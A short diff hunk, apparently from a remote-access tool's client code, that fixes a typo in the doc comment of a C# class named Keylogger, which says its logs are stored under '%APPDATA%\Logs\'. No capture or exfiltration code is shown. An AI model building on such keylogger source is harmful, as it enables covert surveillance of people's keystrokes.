@@ -15,7 +15,7 @@ namespace xClient.Core.Utilities
     /// better user experience.
     /// </summary>
     /// <remarks>
-    /// The log files with be written to the log directory which is located under '%APPDATA%\Logs\'.
+    /// The log files will be written to the log directory which is located under '%APPDATA%\Logs\'.
     /// </remarks>
     public class Keylogger : IDisposable
     {
